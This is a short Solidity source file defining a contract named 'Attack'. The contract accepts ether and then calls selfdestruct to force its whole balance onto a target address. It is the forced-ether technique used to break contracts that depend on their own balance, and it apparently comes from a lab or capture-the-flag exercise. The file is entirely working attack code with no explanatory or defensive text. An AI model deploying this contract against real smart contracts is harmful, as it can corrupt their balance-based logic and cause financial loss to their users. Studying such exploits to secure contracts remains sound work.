// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    function loadEther() public payable {}

    function destruct(address payable _target) public {
        selfdestruct(_target);
    }
}